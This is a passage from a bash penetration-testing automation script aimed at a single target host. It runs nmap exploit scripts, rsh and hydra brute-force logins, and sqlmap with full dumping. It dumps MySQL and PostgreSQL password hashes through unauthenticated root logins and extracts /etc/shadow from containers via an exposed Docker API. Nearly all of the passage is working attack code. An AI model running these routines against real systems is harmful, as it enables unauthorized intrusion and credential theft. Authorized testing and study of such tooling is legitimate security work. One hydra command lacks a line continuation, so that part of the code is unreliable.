        nmap -T3 -Pn -p $scanports --script=exploit,vuln -oN "$RECONDIR"/${TARGET}.nmap-exploitvuln $TARGET

    screen -dmS ${TARGET}.nmap-discoverysafe.$RANDOM $TIMEOUT 28800 \
        nmap -T3 -Pn -p $scanports --script=discovery,safe -oN "$RECONDIR"/${TARGET}.nmap-discoverysafe $TARGET
    

    return 0
}    
################################################################################

################################################################################
function rshBrute()
{
    local login

    for login in $(cat "$RECONDIR"/tmp/users.lst)
    do
        $TIMEOUT 900 netkit-rsh -l $login $TARGET id -a 2>&1 |grep -v 'Permission denied' \
            >>"$RECONDIR"/${TARGET}.rsh 
    done

    return 0
}
################################################################################

################################################################################
function nfsScan()
{
    local output
    local i

    ( $TIMEOUT 90 showmount -e ${TARGET} >"$RECONDIR"/${TARGET}.showmount-e 2>&1 \
        || rm -f "$RECONDIR"/${TARGET}.showmount-e >/dev/null 2>&1 ) &
    ( $TIMEOUT 90 showmount -a ${TARGET} >"$RECONDIR"/${TARGET}.showmount-a 2>&1 \
        || rm -f "$RECONDIR"/${TARGET}.showmount-a >/dev/null 2>&1 ) &


    # the nfs-ls nse script only works half the time
    for i in {1..10}
    do
        output=$($TIMEOUT 60 nmap -Pn -p 111 --script=nfs-ls $TARGET 2>&1)
        if echo $output|grep -q nfs-ls:
        then
            echo "$output" > "$RECONDIR"/${TARGET}.nmap-nfsls
            break
        fi
    done

    return 0
}
################################################################################

################################################################################
function dnsScan()
{
    local domain
    local arpa
    local subnet=()
    local a
    local b

    domain=$(host $IP $IP |grep 'domain name pointer' \
        |tail -1 |sed -e 's/.*domain name pointer \(.*\)./\1/'  |sed -e 's/\.$//')
    if [[ "$(echo $domain |grep -o '.' |grep -c '\.')" -ge 3 ]]
    then
        domain=$(host $IP $IP |grep 'domain name pointer' |tail -1 \
            |sed -e 's/.*domain name pointer \(.*\)./\1/'  |sed -e 's/\.$//' |cut -d'.' -f2-)
    fi

    if [[ $domain =~ ^..* ]]
    then
        $TIMEOUT 90 dnsenum --dnsserver $TARGET -f "$RECONDIR"/tmp/dns.lst --nocolor --enum -p0 $domain \
            >>"$RECONDIR"/${TARGET}.dnsenum 2>&1 &
        $TIMEOUT 90 dnsrecon -d $domain -n $TARGET >>"$RECONDIR"/${TARGET}.dnsrecon 2>&1 
        host -a $domain. $TARGET >>"$RECONDIR"/${TARGET}.host-a 2>&1 &
        host -l $domain. $TARGET >>"$RECONDIR"/${TARGET}.host-l 2>&1 &
    fi

    $TIMEOUT 900 dnsrecon -n $TARGET -r ${IP%.*}.0-${IP%.*}.255  \
        >>"$RECONDIR"/${TARGET}.dnsreconptr.local 2>&1 

    mkdir -p "$RECONDIR"/${TARGET}.arpas >/dev/null 2>&1
    for a in {0..255}
    do
        for b in {0..255}
        do
            host -a $b.$a.10.in-addr.arpa. ${TARGET} \
                > "$RECONDIR"/${TARGET}.arpas/$b.$a.10.in-addr.arpa. 2>&1
            if grep -q "Host $b.$a.10.in-addr.arpa. not found:" "$RECONDIR"/${TARGET}.arpas/$b.$a.10.in-addr.arpa.
            then
                rm -f "$RECONDIR"/${TARGET}.arpas/$b.$a.10.in-addr.arpa. >/dev/null 2>&1
            fi
        done
    done
    for a in {16..31}
    do
        for b in {0..255}
        do
            host -a $b.$a.172.in-addr.arpa. ${TARGET} \
                > "$RECONDIR"/${TARGET}.arpas/$b.$a.172.in-addr.arpa. 2>&1
            if grep -q "Host $b.$a.172.in-addr.arpa. not found:" "$RECONDIR"/${TARGET}.arpas/$b.$a.172.in-addr.arpa.
            then
                rm -f "$RECONDIR"/${TARGET}.arpas/$b.$a.172.in-addr.arpa. >/dev/null 2>&1
            fi
        done
    done
    for a in {0..255}
    do
        host -a $a.168.192.in-addr.arpa. ${TARGET} \
            > "$RECONDIR"/${TARGET}.arpas/$a.168.192.in-addr.arpa. 2>&1
        if grep -q "Host $a.168.192.in-addr.arpa. not found:" "$RECONDIR"/${TARGET}.arpas/$a.168.192.in-addr.arpa.
        then
            rm -f "$RECONDIR"/${TARGET}.arpas/$a.168.192.in-addr.arpa. >/dev/null 2>&1
        fi
    done

    # pull discovered domains from arpa files
    egrep "IN\s+NS\s" "$RECONDIR"/${TARGET}.arpas/*.arpa. |awk '{print $5}'|cut -d'.' -f2-  |sort -u \
        > "$RECONDIR"/${TARGET}.domains 2>&1
    for domain in $(cat "$RECONDIR"/${TARGET}.domains)
    do
        host -a $domain $TARGET >>"$RECONDIR"/${TARGET}.host-a.$domain 2>&1
        host -l $domain $TARGET >>"$RECONDIR"/${TARGET}.host-l.$domain 2>&1
    done
            

    for arpa in $(cat "$RECONDIR"/${TARGET}.arpas/*.in-addr.arpa. \
        |egrep "\s+IN\s+SOA\s" |awk '{print $1}' |sed -e 's/.in-addr.arpa.*//g' |sort -u)
    do
        IFS='.' subnet=($arpa)
        IFS=' '
        if [[ ${#subnet[@]} -eq 2 ]]
        then
            $TIMEOUT 1800 dnsrecon -n $TARGET -r ${subnet[1]}.${subnet[0]}.0.0/16 \
                >>"$RECONDIR"/${TARGET}.dnsreconptr.${subnet[1]}.${subnet[0]} 2>&1 
        elif [[ ${#subnet[@]} -eq 3 ]]
        then
            $TIMEOUT 1800 dnsrecon -n $TARGET -r ${subnet[2]}.${subnet[1]}.${subnet[0]}.0/24 \
                >>"$RECONDIR"/${TARGET}.dnsreconptr.${subnet[2]}.${subnet[1]}.${subnet[0]} 2>&1 
        fi

    done

    return 0
}
################################################################################

################################################################################
function ikeScan()
{
    local port=$1
    $TIMEOUT 90 ike-scan -d $port $TARGET >>"$RECONDIR"/${TARGET}.${port}.ike-scan 2>&1 

    return 0
}
################################################################################

################################################################################
function rsyncScan()
{
    local port=$1
    local share

    $TIMEOUT 90 rsync --list-only --port=$port rsync://$TARGET >>"$RECONDIR"/${TARGET}.${port}.rsync 2>&1 \
        || rm -f "$RECONDIR"/${TARGET}.${port}.rsync >/dev/null 2>&1
    if [[ -f  "$RECONDIR"/${TARGET}.${port}.rsync ]]
    then
        for share in $(cat "$RECONDIR"/${TARGET}.${port}.rsync)
        do
            $TIMEOUT 600 rsync --list-only --port=${port%%/*} rsync://$TARGET/$share \
                >>"$RECONDIR"/${TARGET}.${port}.rsync-$share 2>&1 
        done
    fi

    return 0
}
################################################################################

################################################################################
function smbScan()
{
    local share
    local cmd

    smbclient -g -N -L $TARGET >"$RECONDIR"/${TARGET}.smbshares 2>&1
    for share in $(egrep '^Disk' "$RECONDIR"/${TARGET}.smbshares |cut -d'|' -f2)
    do
        echo "####################" >>"$RECONDIR"/${TARGET}.smbdirs
        echo "//$TARGET/$share" >>"$RECONDIR"/${TARGET}.smbdirs
        $TIMEOUT 90 smbclient -N -c dir //$TARGET/"$share" >>"$RECONDIR"/${TARGET}.smbdirs 2>&1
        echo "" >>"$RECONDIR"/${TARGET}.smbdirs
        echo "" >>"$RECONDIR"/${TARGET}.smbdirs
    done
    for cmd in srvinfo dsgetdcinfo ntsvcs_getversion wkssvc_wkstagetinfo wkssvc_getjoininformation wkssvc_enumeratecomputernames dfsenum netshareenumall enumdomusers enumdomgroups
    do
        echo "####################" >>"$RECONDIR"/${TARGET}.rpcclient
        echo "cmd: $cmd" >>"$RECONDIR"/${TARGET}.rpcclient
        $TIMEOUT 90 rpcclient -U "" $TARGET -N -c $cmd >>"$RECONDIR"/${TARGET}.rpcclient 2>&1
        echo "" >>"$RECONDIR"/${TARGET}.rpcclient
        echo "" >>"$RECONDIR"/${TARGET}.rpcclient
    done

    return 0
}
################################################################################

################################################################################
function mysqlScan()
{
    local port=$1
    local db

    echo "show databases" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
    $TIMEOUT 60 mysql -E -u root -e 'show databases;' --connect-timeout=30 -h $TARGET \
        >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1


    for db in $(cat "$RECONDIR"/${TARGET}.mysql.$port |awk '/^Database:/ {print $2}')
    do
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
        echo "Tables from database $db" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
        $TIMEOUT 60 mysql -E -u root -D "$db" -e 'show tables;' --connect-timeout=30 -h $TARGET \
            |grep -v 'row *' >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
    done

    echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
    echo "show full processlist;" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
    $TIMEOUT 60 mysql -E -u root -e 'show full processlist;' --connect-timeout=30 -h $TARGET \
        >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1

    echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
    echo "select host,user,password from mysql.user;" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
    $TIMEOUT 60 mysql -E -u root -e 'select host,user,password from mysql.user;' --connect-timeout=30 -h $TARGET \
        >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1

    return 0
}
################################################################################

################################################################################
function passHydra()
{
    local port=$1
    local service=$2
    local file="/usr/share/seclists/Passwords/Default-Credentials/$3"

    if [[ ! -f "$file" ]]
    then
        echo "ERROR in passHydra: file not found: $file"
        return 1
    fi

    $TIMEOUT 28800 hydra -I \
        -P $file \
        -u -t 1 -s $port $TARGET $service \
        >> "$RECONDIR"/${TARGET}.$service.$port.hydra 2>&1
    if ! grep -q 'valid pair found' "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
    then
        rm -f "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
    fi

    return 0
}
################################################################################

################################################################################
function doHydra()
{
    local port=$1
    local service=$2
    local file=$3

    if [[ ! -f "$file" ]]
    then
        echo "ERROR in doHydra: file not found: $file"
        return 1
    fi

    $TIMEOUT 28800 hydra -I \
        -C $file \
        -u -t 1 -s $port $TARGET $service \
        >> "$RECONDIR"/${TARGET}.$service.$port.hydra 2>&1
    if ! grep -q 'valid pair found' "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
    then
        rm -f "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
    fi

    return 0
}
################################################################################

################################################################################
function postgresqlScan()
{
    local port=$1
    local db

    $TIMEOUT 60 psql -h $TARGET -p $port -U postgres -l -x \
        >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1

    for db in $(cat "$RECONDIR"/${TARGET}.postgresql.$port |awk '/^Name/ {print $3}')
    do
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
        echo "Tables from database $db" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
        $TIMEOUT 60 psql -c 'SELECT * FROM pg_catalog.pg_tables;' -d $db \
            >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
    done

    echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
    echo "select * from pg_stat_activity" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
    $TIMEOUT 60 psql -h $TARGET -p $port -U postgres -x -c 'select * from pg_stat_activity;' \
        >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1

    echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
    echo "select * from pg_catalog.pg_shadow" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
    $TIMEOUT 60 psql -h $TARGET -p $port -U postgres -x -c 'select * from pg_catalog.pg_shadow;' \
        >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1

    return 0
}
################################################################################

################################################################################
function dockerScan()
{
    local port=$1
    local proto=$2
    local id

    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:$port/info 2>/dev/null|jq -M . \
        >> "$RECONDIR"/${TARGET}.dockerinfo.${port} 2>&1

    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:$port/networks 2>/dev/null|jq -M . \
        >> "$RECONDIR"/${TARGET}.dockernetworks.${port} 2>&1

    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:$port/containers/json 2>/dev/null|jq -M . \
        >> "$RECONDIR"/${TARGET}.dockercontainers.${port} 2>&1

    for id in $(grep '"Id": ' "$RECONDIR"/${TARGET}.dockercontainers.${port} |cut -d'"' -f4)
    do
        $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/top 2>/dev/null|jq -M . \
            >> "$RECONDIR"/dockertop.${port}.${id}
        $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/changes 2>/dev/null|jq -M . \
            >> "$RECONDIR"/dockerchanges.${port}.${id}
        $TIMEOUT 60 curl -k -s "${proto}://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
            2>/dev/null|tar xf - -O \
            >> "$RECONDIR"/dockershadow.${port}.${id} 2>/dev/null

    done

    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:${port}/v2/_catalog 2>/dev/null|jq -M . \
        >> "$RECONDIR"/${TARGET}.dockerepo.${port} 2>&1

    return 0
}
################################################################################

################################################################################
function iscsiScan()
{
    local port=$1

    $TIMEOUT 90 iscsiadm -m discovery -t st -p ${TARGET}:${port} \
        >> "$RECONDIR"/${TARGET}.iscsiadm.${port} 2>&1

    return 0
}
################################################################################

################################################################################
function elasticsearchScan()
{
    local port=$1
    local proto=$2
    local index
    local indexes=()

    $TIMEOUT 90 curl -k -s "${proto}://${TARGET}:${port}/_cat/indices?v" > "$RECONDIR"/${TARGET}.elasticsearch.${port} 2>&1
    $TIMEOUT 90 curl -k -s "${proto}://${TARGET}:${port}/_all/_settings" 2>&1 |jq . > "$RECONDIR"/${TARGET}.elasticsearch.${port}._all_settings 

    if [[ -f "$RECONDIR"/${TARGET}.elasticsearch.${port} ]]
    then
        mkdir "$RECONDIR"/${TARGET}.elasticsearch.indexes.${port}
        indexes=()

        # index will be either column 2 or 3 depending on version
        if head -1 "$RECONDIR"/${TARGET}.elasticsearch.${port} |awk '{print $2}' |grep -q index
        then
            for index in $(awk '{print $2}' "$RECONDIR"/${TARGET}.elasticsearch.${port} |egrep -v "^index$" )
            do
                indexes[${#indexes[@]}]=$index
            done
        elif head -1 "$RECONDIR"/${TARGET}.elasticsearch.${port} |awk '{print $3}' |grep -q index
        then
            for index in $(awk '{print $3}' "$RECONDIR"/${TARGET}.elasticsearch.${port} |egrep -v "^index$" )
            do
                indexes[${#indexes[@]}]=$index
            done
        fi

        for index in ${indexes[@]}
        do
            $TIMEOUT 60 curl -k -s "${proto}://${TARGET}:${port}/${index}/_stats" 2>/dev/null |jq . \
                > "$RECONDIR"/${TARGET}.elasticsearch.indexes.${port}/$index 2>&1
        done
    fi

    return 0
}
################################################################################

################################################################################
function redisScan()
{
    local port=$1
    local i

    for i in {0..16}
    do
        $TIMEOUT 90 redis-cli -h $TARGET -p $port -n $i --scan \
            >> "$RECONDIR"/${TARGET}.redis.${port} 2>&1
    done

    return 0
}
################################################################################

################################################################################
function ldapScan()
{
    local port=$1
    local context

    $TIMEOUT 120 ldapsearch -h $TARGET -p $port -x -s base \
        >> "$RECONDIR"/${TARGET}.ldap.${port} 2>&1

    for context in $(awk '/^namingContexts: / {print $2}' "$RECONDIR"/${TARGET}.ldap.${port})
    do
        $TIMEOUT 300 ldapsearch -h $TARGET -p $port -x -b "$context" \
            >> "$RECONDIR"/${TARGET}.ldap.${port}.${context} 2>&1
    done


    return 0
}
################################################################################

################################################################################
function webDiscover()
{
    local a_dirbfiles=()
    local a_robots=()
    local a_urls=()
    local dirbfile
    local newurl
    local port
    local robotdir
    local shortfile
    local sslflag
    local url
    local wordlist
    local urlfile


    # Build dirb dictionary array
    for wordlist in /usr/share/dirb/wordlists/common.txt \
    /usr/share/dirb/wordlists/vulns/*txt \
    /usr/share/wordlists/metasploit/sap_icm_paths.txt \
    /usr/share/wordlists/metasploit/joomla.txt \
    /usr/share/wordlists/metasploit/http_owa_common.txt \
    /usr/share/wfuzz/wordlist/general/admin-panels.txt \
    "$RECONDIR"/tmp/mkrecon.txt \
    "$RECONDIR"/${TARGET}.webwords 
    do
        if [[ -f "$wordlist" ]]
        then
            a_dirbfiles[${#a_dirbfiles[@]}]=$wordlist
        fi
    done

    # first run through baseurls
    for url in $(cat "$RECONDIR"/${TARGET}.baseurls)
    do
        urlfile=${url//\//,}

        echo "$BORDER" >>"$RECONDIR"/${TARGET}.robots.txt
        echo "${url}/robots.txt" >>"$RECONDIR"/${TARGET}.robots.txt
        curl -s ${url}/robots.txt >>"$RECONDIR"/${TARGET}.robots.txt 2>&1
        echo "" >>"$RECONDIR"/${TARGET}.robots.txt
        echo "$BORDER" >>"$RECONDIR"/${TARGET}.robots.txt

        for robotdir in $(curl -s ${url}/robots.txt 2>&1 \
            |egrep '^Disallow: ' |awk '{print $2}' |sed -e 's/\*//g' |tr -d '\r')
        do
            if [[ ! $robotdir =~ ^/$ ]] \
            && [[ ! $robotdir =~ \? ]] \
            && [[ $robotdir =~ /$ ]] 
            then
                a_robots[${#a_robots[@]}]="${url}${robotdir}"
            fi
            $TIMEOUT 60 \
                wget --no-check-certificate -r -l3 --spider --force-html -D $TARGET ${url}${robotdir} 2>&1 \
                | grep '^--' |grep -v '(try:' | awk '{ print $3 }' \
                >> "$RECONDIR"/tmp/${TARGET}.robotspider.raw 2>/dev/null
        done

        $TIMEOUT 60 wget --no-check-certificate -r -l3 --spider --force-html -D $TARGET "$url" 2>&1 \
            | grep '^--' |grep -v '(try:' | awk '{ print $3 }' |grep "/$TARGET[:/]"  \
            >> "$RECONDIR"/tmp/${TARGET}.spider.raw 2>/dev/null
    done

    # second run through baseurls.  dirb may take hours
    for url in $(cat "$RECONDIR"/${TARGET}.baseurls)
    do
        # do not put all txt files on dirb cmdline cuz it truncates it's args
        # instead iterate over an array
        mkdir -p "$RECONDIR"/tmp/${TARGET}.dirb >/dev/null 2>&1
        for dirbfile in ${a_dirbfiles[@]}
        do
            shortfile=${dirbfile##*/}
            $TIMEOUT 1800 dirb "$url" "$dirbfile" -r -f -S \
                >> "$RECONDIR"/tmp/${TARGET}.dirb/${TARGET}-${shortfile}.dirb 2>&1
        done
    done

    # run dirb on everything robots.txt tells us to ignore
    for url in ${a_robots[@]}
    do
        for dirbfile in ${a_dirbfiles[@]}
        do
            shortfile=${dirbfile##*/}
            # check if dirb was already run on this url
            if ! grep -q "$url" "$RECONDIR"/tmp/${TARGET}.dirb/${TARGET}-${shortfile}.dirb 2>/dev/null
            then
                $TIMEOUT 1800 dirb "$url" "$dirbfile" -r -f -S \
                    >> "$RECONDIR"/tmp/${TARGET}.dirb/${TARGET}-robots-${shortfile}.dirb 2>&1
            fi
        done
    done

    for url in $(cat "$RECONDIR"/tmp/${TARGET}.robotspider.raw 2>/dev/null|sort -u)
    do
        echo "<a href=\"$url\">$url</a><br>" >> "$RECONDIR"/${TARGET}.robotspider.html
    done

    for url in $(grep CODE:200 "$RECONDIR"/tmp/${TARGET}.dirb/${TARGET}-*.dirb \
        |grep -v SIZE:0 |awk '{print $2}' |sort -u)
    do
        echo "${url%\?*}" >> "$RECONDIR"/tmp/${TARGET}.dirburls.raw
    done

    for url in $(grep '==> DIRECTORY: ' "$RECONDIR"/tmp/${TARGET}.dirb/${TARGET}-*.dirb \
        |awk '{print $3}' |sort -u)
    do
        echo "${url%\?*}" >> "$RECONDIR"/tmp/${TARGET}.dirburls.raw
    done

    cat "$RECONDIR"/tmp/${TARGET}.dirburls.raw 2>/dev/null \
        |sed -e 's/\/\/*$/\//g'|sed -e 's/\/\.\/*$/\//g' \
        |sed -e 's/\/\%2e\/*$/\//g' |sort -u \
        > "$RECONDIR"/${TARGET}.dirburls

    for url in $(cat "$RECONDIR"/${TARGET}.dirburls 2>/dev/null )
    do
        $TIMEOUT 120 wget --no-check-certificate -r -l2 --spider --force-html -D $TARGET "$url" 2>&1 \
            | grep '^--' |grep -v '(try:' |egrep "$IP|$TARGET" | awk '{ print $3 }' \
            >> "$RECONDIR"/tmp/${TARGET}.spider.raw 2>/dev/null
    done

    cat "$RECONDIR"/tmp/${TARGET}.spider.raw "$RECONDIR"/tmp/${TARGET}.robotspider.raw 2>/dev/null \
        |egrep -vi '\.(css|js|png|gif|jpg|gz|ico)$' |sort -u \
        > "$RECONDIR"/${TARGET}.spider
    for url in $(cat "$RECONDIR"/${TARGET}.spider|sort -u)
    do
        urlfile=${url//\//,}
        echo "<a href=\"$url\">$url</a><br>" >> "$RECONDIR"/${TARGET}.spider.html
    done

    # combine wget spider and dirb
    cat "$RECONDIR"/${TARGET}.dirburls "$RECONDIR"/${TARGET}.spider 2>/dev/null  \
        |cut -d'?' -f1|cut -d'%' -f1|cut -d'"' -f1 \
        |egrep -vi '\.(css|js|png|gif|jpg|gz|ico)$' \
        |sed -e "s|$TARGET//|$TARGET/|g" \
        |sort -u > /tmp/${TARGET}.urls.raw

    # remove duplicates that have standard ports.  e.g. http://target:80/dir -> http://target/dir
    for url in $(cat /tmp/${TARGET}.urls.raw 2>/dev/null )
    do
        if echo $url|grep ':80/' |egrep -q '^http://'
        then 
            newurl=$(echo $url|sed -e 's/:80//')
        elif echo $url|grep ':443/' |egrep -q '^https://'
        then
            newurl=$(echo $url|sed -e 's/:443//')
        else 
            newurl=$url
        fi
        echo $newurl >> /tmp/${TARGET}.urls.stripped
    done
    cat /tmp/${TARGET}.urls.stripped 2>/dev/null |sort -u > "$RECONDIR"/${TARGET}.urls 
    rm -f /tmp/${TARGET}.urls.stripped >/dev/null 2>&1
    rm -f /tmp/${TARGET}.urls.raw >/dev/null 2>&1

    for url in $(cat "$RECONDIR"/${TARGET}.urls 2>/dev/null )
    do 
        echo "<a href=\"$url\">$url</a><br>" >> "$RECONDIR"/${TARGET}.urls.html
    done

    for url in $(grep CODE:401 "$RECONDIR"/tmp/${TARGET}.dirb/${TARGET}-*.dirb 2>/dev/null \
        |awk '{print $2}'\
        |sed -e 's/\/*$/\//g'\
        |sort -u)
    do
        echo "${url%\?*}" >> "$RECONDIR"/${TARGET}.dirburls.401
    done

    return 0
}
################################################################################

################################################################################
function niktoScan()
{
    local url
    local urlfile

    for url in $(cat "$RECONDIR"/${TARGET}.baseurls)
    do
        # Run nikto in the background
        urlfile=${url//\//,}
        screen -dmS ${TARGET}.nikto.$RANDOM -L -Logfile "$RECONDIR"/${urlfile}.nikto \
            $TIMEOUT 900 nikto -no404 -host "$url"
    done


    return 0
}
################################################################################

################################################################################
function getHeaders()
{
    local url

    for url in $(cat "$RECONDIR"/${TARGET}.urls)
    do 
        echo "$BORDER" >> "$RECONDIR"/${TARGET}.headers 2>&1
        echo "$url" >> "$RECONDIR"/${TARGET}.headers
        $TIMEOUT 30 wget -q -O /dev/null --no-check-certificate -S  -D $TARGET --method=OPTIONS "$url" \
            >> "$RECONDIR"/${TARGET}.headers 2>&1
    done

    return 0
}
################################################################################

################################################################################
function skipfishScan()
{
    local url
    local a_urls=()

    for url in $(cat "$RECONDIR"/${TARGET}.baseurls)
    do
        a_urls[${#a_urls[@]}]="$url"
    done
    screen -dmS ${TARGET}.skipfish.$RANDOM \
        skipfish -k 0:30:00 -g2 -f20 -o "$RECONDIR"/${TARGET}.skipfish ${a_urls[*]}
    return 0
}
################################################################################

################################################################################
function hydraScanURLs()
{
    local path
    local hydrafile
    local sslflag
    local url
    local port

    # hydra
    for url in $(cat "$RECONDIR"/${TARGET}.dirburls.401)
    do
        if [[ "$url" =~ ^https ]]
        then
            sslflag="-S"
        else
            sslflag=""
        fi
        port=$(getPortFromUrl "$url")
        path=/${url#*//*/}
        hydrafile=${url//\//,}.hydra
        mkdir -p "$RECONDIR"/${TARGET}.hydra >/dev/null 2>&1

        # Test with separate user/pass files
        echo "TESTING $url"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
        echo "$BORDER"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
        $TIMEOUT 900 hydra -I -L "$RECONDIR"/tmp/users.lst \
            -P "$RECONDIR"/tmp/passwds.lst -e nsr \
            -u -t 3 $sslflag -s $port $TARGET http-get "$path" \
            >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1

        # Test with default creds from routersploit
        echo "TESTING $url"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
        echo "$BORDER"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
        $TIMEOUT 900 hydra -I 
            -C /usr/share/routersploit/routersploit/wordlists/defaults.txt \
            -u -t 3 $sslflag -s $port $TARGET http-get "$path" \
            >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1

        grep -q 'valid pair found' "$RECONDIR"/${TARGET}.hydra/${hydrafile} \
            && cp -f "$RECONDIR"/${TARGET}.hydra/${hydrafile} "$RECONDIR"/${TARGET}.${hydrafile} 2>/dev/null
    done
    #remove directory if empty
    rmdir "$RECONDIR"/${TARGET}.hydra >/dev/null 2>&1

    return 0
}
################################################################################


################################################################################
function sqlmapScan()
{
    local url

    for url in $(grep '?' "$RECONDIR"/${TARGET}.spider 2>/dev/null)
    do
        $TIMEOUT 300 sqlmap --random-agent --batch --flush-session -a -u "$url" 2>&1 \
            |egrep -v '\[INFO\] (testing|checking|target|flushing|heuristics|confirming|searching|dynamic|URI parameter)|\[WARNING\]|\[CRITICAL\]|shutting down|starting at|do you want to try|legal disclaimer:|404 \(Not Found\)|how do you want to proceed|it is not recommended|do you want sqlmap to try|^\|_|^ ___|^      \||^       __H|^        ___|fetched random HTTP User-Agent|there was an error checking|Do you want to follow|Do you want to try|Method Not Allowed|do you want to skip' \
            |uniq >> "$RECONDIR"/${TARGET}.sqlmap 2>&1
    done

    return 0
}
################################################################################

################################################################################
function webWords()
{
    local url
    for url in $(cat "$RECONDIR"/${TARGET}.baseurls)
    do
        # collect words from websites
        $TIMEOUT 1800 wget -rq -D $TARGET -O "$RECONDIR"/tmp/wget.dump "$url" >/dev/null 2>&1
        if [[ -f "$RECONDIR"/tmp/wget.dump ]]
        then
            html2dic "$RECONDIR"/tmp/wget.dump 2>/dev/null |grep -v -P '[^\x00-\x7f]' |sort -u \
                >> "$RECONDIR"/tmp/${TARGET}.webwords 
            rm -f "$RECONDIR"/tmp/wget.dump >/dev/null 2>&1
        fi
    done

    # combine all the words from the wget spider
    if [[ -f "$RECONDIR"/tmp/${TARGET}.webwords ]]
    then
        sort -u "$RECONDIR"/tmp/${TARGET}.webwords > "$RECONDIR"/${TARGET}.webwords 2>/dev/null
    fi

    return 0
}
################################################################################

################################################################################
function cewlCrawl()
{
    local url
    local urlfile

    mkdir -p "$RECONDIR"/tmp/cewl >/dev/null 2>&1
    for url in $(cat "$RECONDIR"/${TARGET}.spider 2>/dev/null )
    do
        urlfile=${url//\//,}
        $TIMEOUT 20 cewl -d 1 -a --meta_file "$RECONDIR"/tmp/cewl/${TARGET}.${urlfile}.cewlmeta \
            -e --email_file "$RECONDIR"/tmp/cewl/${TARGET}.${urlfile}.cewlemail \
            -w "$RECONDIR"/tmp/cewl/${TARGET}.${urlfile}.cewl \
            "$url" >/dev/null 2>&1 
    done

    cat "$RECONDIR"/tmp/cewl/${TARGET}.*.cewl 2>/dev/null |sort -u > "$RECONDIR"/${TARGET}.cewl
    cat "$RECONDIR"/tmp/cewl/${TARGET}.*.cewlemail 2>/dev/null |sort -u > "$RECONDIR"/${TARGET}.cewlemail
    cat "$RECONDIR"/tmp/cewl/${TARGET}.*.cewlmeta 2>/dev/null |sort -u > "$RECONDIR"/${TARGET}.cewlmeta

    return 0
}
################################################################################

################################################################################
function hydraPost()
{


    # incorrect invalid failure failed "try again" wrong forgotten

    # hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt

    return 0
}
################################################################################

################################################################################
function fuzzURLs()
{
    local a_vars=()
    local file
    local filename
    local ignore
    local line
    local method
    local url
    local var
    local varstring
    local wfuzzfile
    local IFS=$'\n'
    local i=0

    mkdir -p "$RECONDIR"/${TARGET}.wfuzz/raws >/dev/null 2>&1
    for url in $( egrep '?.*=' "$RECONDIR"/${TARGET}.spider \
        |egrep -v '/\?' \
        |sed -e 's/\(\?[^=]*\)=[^&]*/\1=FUZZ/g' \
        |sed -e 's/\(\&[^=]*\)=[^&]*/\1=FUZZ/g' \
        |sed -e 's/\?$/\?FUZZ/' \
        |sort -u 2>/dev/null 
    )
    do
        echo "none $url" >> "$RECONDIR"/tmp/${TARGET}.FUZZ.raw
    done


    if [[ -f "$RECONDIR"/${TARGET}.mech-dump ]]
    then
        cat "$RECONDIR"/${TARGET}.mech-dump |while read line
        do
            if [[ $line =~ ^GET ]]
            then
                url=$(echo $line |awk '{print $2}')
                a_vars=()
                method=get
                continue
            fi
        
            if [[ $line =~ ^POST ]]
            then
                url=$(echo $line |awk '{print $2}')
                a_vars=()
                method=post
                continue
            fi
        
            if [[ $line =~ = ]] \
            && [[ ! $line =~ NONAME ]] \
            && [[ ! $line =~ (submit) ]] \
            && [[ $url =~ http ]]
            then
                var=$(echo $line |awk '{print $1}'|cut -d'=' -f1)=FUZZ
                a_vars[${#a_vars[@]}]=$var
                continue
            fi
        
            if [[ $url =~ http ]] \
            && [[ x${line}x == "xx" || $line =~ ^# ]] 
            then
                varstring=$(joinBy \& ${a_vars[@]})
                if [[ $method == "get" ]]
                then
                    echo "none $url?$varstring" >> "$RECONDIR"/tmp/${TARGET}.FUZZ.raw
                fi
                if [[ $method == "post" ]]
                then
                    echo "$varstring $url" >> "$RECONDIR"/tmp/${TARGET}.FUZZ.raw
                fi
                a_vars=()
            fi
        done
    fi

